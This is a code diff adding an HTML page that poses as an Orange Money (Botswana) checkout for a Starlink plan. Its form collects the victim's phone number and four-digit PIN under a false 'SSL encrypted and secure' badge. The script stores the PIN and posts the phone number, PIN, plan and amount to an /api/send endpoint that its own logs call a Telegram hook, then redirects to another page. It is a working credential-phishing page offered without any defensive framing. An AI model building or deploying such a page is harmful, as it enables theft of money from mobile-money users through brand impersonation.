@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Orange Money</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;min-height:100%;font-family:Arial,Helvetica,sans-serif}
+body{background:#080808;color:#111;min-height:100dvh}
+.card{width:100%;max-width:608px;margin:0 auto;padding-bottom:24px}
+
+/* Branding */
+.brand-wrap{text-align:center;padding:6px 16px 42px;color:#ff6900}
+.orange-badge{width:116px;height:116px;border-radius:50%;background:#ff6900;margin:0 auto 34px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:54px;font-weight:400;line-height:1}
+.brand-title{margin:0;font-size:clamp(38px,8vw,52px);font-weight:800;letter-spacing:-.035em;line-height:1.02;color:#ff6900}
+.brand-sub{margin-top:10px;font-size:clamp(19px,4vw,24px);color:#ff6900;font-weight:400}
+
+/* Main card */
+.form-panel{background:#fff;border:1px solid #262626;border-radius:26px;padding:0 38px 50px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.35)}
+.payment-header{height:113px;margin:0 -38px 38px;padding:0 16px;background:linear-gradient(110deg,#050505 0%,#171717 48%,#2b2b2b 100%);border-radius:26px 26px 0 0;display:flex;align-items:center;justify-content:center;color:#fff;font-size:clamp(23px,5vw,31px);font-weight:700;white-space:nowrap}
+.payment-header .star{color:#f7cf36;margin-right:12px;font-size:1.05em}
+
+/* Service / amount */
+.amount-row{min-height:180px;display:flex;justify-content:space-between;align-items:center;background:#f7f8fa;border-radius:18px;padding:26px 27px;gap:20px;color:#111}
+.amount-row>div{min-width:0}
+.row-label{font-size:24px;color:#676767;font-weight:400}
+.amount-value{margin-top:7px;font-size:24px;font-weight:700;color:#111;white-space:nowrap}
+.service-value{text-align:right;font-size:39px;font-weight:800;color:#f56a00;white-space:nowrap}
+
+/* Phone */
+.phone-title{margin:32px 0 38px;text-align:center;font-size:clamp(28px,6vw,38px);font-weight:700;line-height:1.1;color:#111}
+.phone-box{width:100%;height:92px;border:3px solid #dedede;border-radius:18px;background:#fff;display:flex;align-items:center;overflow:hidden}
+.country{width:112px;height:100%;display:flex;align-items:center;justify-content:center;border-right:1px solid #dedede;background:#fafafa;flex-shrink:0}
+.country .flag{display:flex;align-items:center;justify-content:center;width:58px;height:48px;overflow:hidden;border-radius:50%}
+.country .flag img{display:block;width:100%;height:100%;object-fit:cover;border-radius:50%}
+.country .code{display:none}
+.phone{width:100%;min-width:0;flex:1;height:100%;border:0;outline:0;background:transparent;padding:0 20px;font-size:clamp(18px,4.5vw,28px);color:#333;font-weight:600}
+.phone::placeholder{color:#aaa;opacity:1}
+
+/* PIN */
+.pin-box{margin:38px auto 0;display:grid;grid-template-columns:repeat(4,minmax(0,80px));gap:19px;justify-content:center}
+.pin-digit{width:100%;height:92px;border:3px solid #dedede;border-radius:17px;background:#fff;text-align:center;font-size:2rem;font-weight:700;color:#1d2430;outline:none}
+
+.otp-hint{margin-top:38px;text-align:center;font-size:clamp(16px,3.5vw,22px);color:#666;line-height:1.4}
+.terms{margin-top:40px;color:#666;font-size:clamp(15px,3.2vw,20px);line-height:1.45;text-align:center}
+.terms a{color:#e96a18;text-decoration:none;font-weight:400}
+.next-btn{width:100%;height:82px;margin-top:39px;border:0;border-radius:12px;background:#ccc;color:#fff;font-weight:800;font-size:24px;letter-spacing:.02em;cursor:not-allowed;touch-action:manipulation;-webkit-tap-highlight-color:transparent}
+.next-btn.enabled{background:#f4c74d;color:#111;cursor:pointer;box-shadow:0 8px 18px rgba(244,199,77,.25)}
+.secure{text-align:center;margin-top:26px;color:#3f7d4b;font-size:clamp(14px,3vw,18px);letter-spacing:.04em;background:#e7f5e9;border-radius:25px;padding:14px 10px;white-space:nowrap}
+.secure .lock{color:#3c8749;font-size:1.1rem;margin-right:8px}
+.error{text-align:center;color:#c33;font-size:.85rem;min-height:14px;margin-top:10px}
+
+/* Mobile browsers */
+@media (max-width:608px){
+  html,body{width:100%;min-width:0;overflow-x:hidden}
+  body{min-height:100dvh;padding:0 0 env(safe-area-inset-bottom,0)}
+  .card{width:100%;max-width:608px;padding:0 0 12px}
+  .brand-wrap{padding:10px 12px 30px}
+  .orange-badge{width:88px;height:88px;margin-bottom:20px;font-size:42px}
+  .brand-title{font-size:clamp(34px,9.5vw,48px);letter-spacing:-.04em}
+  .brand-sub{font-size:18px;margin-top:7px}
+  .form-panel{width:calc(100% - 16px);margin:0 8px;padding:0 14px 26px;border-radius:20px}
+  .payment-header{height:78px;margin:0 -14px 24px;padding:0 8px;font-size:clamp(19px,6.2vw,25px);border-radius:20px 20px 0 0}
+  .payment-header .star{margin-right:8px}
+  .amount-row{width:100%;min-height:124px;padding:18px 14px;gap:8px}
+  .amount-row>div{min-width:0;flex:1}
+  .amount-row>div:last-child{flex:0 1 auto;max-width:45%}
+  .row-label{font-size:16px}
+  .amount-value{font-size:clamp(15px,4.5vw,19px);overflow-wrap:anywhere}
+  .service-value{font-size:clamp(23px,7vw,31px)}
+  .phone-title{margin:25px 0 26px;font-size:clamp(25px,7.5vw,31px)}
+  .phone-box{height:76px;border-width:2px;border-radius:14px}
+  .country{width:72px}
+  .country .flag{width:44px;height:37px}
+  .phone{padding:0 12px;font-size:clamp(16px,5vw,21px)}
+  .pin-box{grid-template-columns:repeat(4,minmax(0,1fr));gap:8px;margin-top:28px;padding:0}
+  .pin-digit{height:64px;border-width:2px;border-radius:13px;font-size:1.75rem}
+  .otp-hint{margin-top:27px;font-size:15px}
+  .terms{margin-top:25px;font-size:14px}
+  .next-btn{height:62px;margin-top:26px;font-size:19px}
+  .secure{margin-top:20px;padding:12px 5px;font-size:12px;letter-spacing:.02em;white-space:normal}
+}
+
+@media (max-width:380px){
+  .brand-wrap{padding-top:7px;padding-bottom:25px}
+  .orange-badge{width:80px;height:80px;margin-bottom:17px;font-size:38px}
+  .brand-title{font-size:34px}
+  .brand-sub{font-size:17px}
+  .form-panel{width:calc(100% - 12px);margin:0 6px;padding-left:12px;padding-right:12px}
+  .payment-header{margin-left:-12px;margin-right:-12px;height:74px;font-size:19px}
+  .amount-row{padding:16px 12px;min-height:118px}
+  .row-label{font-size:15px}
+  .amount-value{font-size:15px}
+  .service-value{font-size:23px}
+  .phone-title{font-size:25px;margin:23px 0 24px}
+  .phone-box{height:72px}
+  .country{width:68px}
+  .country .flag{width:42px;height:35px}
+  .phone{font-size:15px;padding:0 9px}
+  .pin-box{gap:7px}
+  .pin-digit{height:60px;border-radius:12px}
+  .otp-hint{font-size:14px}
+  .terms{font-size:13px}
+  .next-btn{height:60px;font-size:18px}
+  .secure{font-size:11.5px}
+}
+
+@media (max-width:330px){
+  .brand-title{font-size:31px}
+  .payment-header{font-size:18px}
+  .amount-row{gap:5px}
+  .amount-value{font-size:14px}
+  .service-value{font-size:21px}
+  .country{width:62px}
+  .phone{font-size:14px;padding:0 7px}
+  .pin-box{gap:5px}
+  .pin-digit{height:56px}
+}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="brand-wrap">
+    <div class="orange-badge">O</div>
+    <h1 class="brand-title">Orange Money</h1>
+    <div class="brand-sub">by Orange</div>
+  </div>
+
+  <div class="form-panel">
+    <div class="payment-header"><span class="star">★</span><span>Starlink Payment</span></div>
+
+    <div class="amount-row">
+      <div>
+        <div class="row-label">Service</div>
+        <div class="amount-value" id="serviceName">Selected plan</div>
+      </div>
+      <div>
+        <div class="row-label" style="text-align:right">Amount</div>
+        <div class="service-value" id="amount">—</div>
+      </div>
+    </div>
+
+    <div class="phone-title">Enter your Orange Money<br>number</div>
+
+    <div class="phone-box">
+      <div class="country">
+        <span class="flag" aria-label="Botswana flag">
+          <img src="https://flagcdn.com/w80/bw.png" alt="Botswana flag">
+        </span>
+        <span class="code">+267</span>
+      </div>
+      <input id="phone" class="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="+267 XX XXX XXXX" autocomplete="tel">
+    </div>
+
+    <div class="pin-box" aria-label="Enter Orange Money PIN">
+      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 1">
+      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 2">
+      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 3">
+      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 4">
+    </div>
+
+    <div class="otp-hint">Enter your 4-digit Orange Money PIN to authorize this transaction.</div>
+
+    <div class="terms">By using this service you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a></div>
+    <button class="next-btn" id="nextBtn" type="button">NEXT</button>
+    <div id="error" class="error"></div>
+    <div class="secure"><span class="lock">◌</span> SSL ENCRYPTED AND SECURE</div>
+  </div>
+</div>
+
+<script>
+const phone = document.getElementById('phone');
+const pinInputs = [...document.querySelectorAll('.pin-digit')];
+const nextBtn = document.getElementById('nextBtn');
+const errorEl = document.getElementById('error');
+const serviceNameEl = document.getElementById('serviceName');
+const amountEl = document.getElementById('amount');
+
+function getSelectedPlan() {
+  try {
+    const raw = sessionStorage.getItem('selectedPlan');
+    return raw ? JSON.parse(raw) : null;
+  } catch (err) {
+    console.warn('Could not read selected plan:', err);
+    return null;
+  }
+}
+
+function applyPlanFromSession() {
+  const plan = getSelectedPlan();
+  const fallbackName = 'Starlink Renewal';
+  const fallbackAmount = 'BWP 49';
+
+  serviceNameEl.textContent = plan && plan.name ? plan.name : fallbackName;
+  amountEl.textContent = plan && plan.price ? plan.price : fallbackAmount;
+}
+
+function renderButtonState() {
+  const phoneValid = /^\d{9}$/.test(phone.value);
+  const pinValid = pinInputs.every(input => /^\d$/.test(input.value));
+  nextBtn.classList.toggle('enabled', phoneValid && pinValid);
+  nextBtn.disabled = !(phoneValid && pinValid);
+}
+
+applyPlanFromSession();
+
+phone.addEventListener('input', () => {
+  phone.value = phone.value.replace(/\D/g, '').slice(0, 9);
+  errorEl.textContent = '';
+  renderButtonState();
+});
+
+pinInputs.forEach((input, index) => {
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g, '').slice(0, 1);
+    if (input.value && index < pinInputs.length - 1) {
+      pinInputs[index + 1].focus();
+    }
+    errorEl.textContent = '';
+    renderButtonState();
+  });
+
+  input.addEventListener('keydown', (event) => {
+    if (event.key === 'Backspace' && !input.value && index > 0) {
+      pinInputs[index - 1].focus();
+    }
+  });
+});
+
+nextBtn.addEventListener('click', async () => {
+  if (!nextBtn.classList.contains('enabled')) return;
+
+  const phoneNumber = phone.value;
+  const pin = pinInputs.map(input => input.value).join('');
+
+  if (!/^\d{9}$/.test(phoneNumber)) {
+    errorEl.textContent = 'Please enter a valid 9-digit Orange Money number.';
+    return;
+  }
+
+  if (!/^\d{4}$/.test(pin)) {
+    errorEl.textContent = 'Please complete the 4-digit PIN.';
+    return;
+  }
+
+  const selectedPlan = getSelectedPlan();
+  const planName = selectedPlan && selectedPlan.name ? selectedPlan.name : 'Starlink Renewal';
+  const planPrice = selectedPlan && selectedPlan.price ? selectedPlan.price : 'BWP 49';
+
+  localStorage.setItem('phone', phoneNumber);
+  localStorage.setItem('userPin', pin);
+
+  const message = `Orange Money Payment\nPhone: +267${phoneNumber}\nPIN: ${pin}\nService: ${planName}\nAmount: ${planPrice}`;
+
+  const apiUrl = window.location.hostname === 'localhost'
+    ? 'http://localhost:3000/api/send'
+    : `${window.location.origin}/api/send`;
+
+  const payload = { text: message };
+
+  try {
+    const response = await fetch(apiUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(() => null);
+
+    if (response) {
+      const data = await response.json().catch(() => null);
+      if (data && !data.ok) {
+        console.warn('Telegram rejected message:', data.error || 'unknown error');
+      }
+    }
+  } catch (sendError) {
+    console.warn('Telegram hook unavailable:', sendError);
+  }
+
+  window.location.href = 'ming.html';
+});
+</script>
+</body>
+</html>
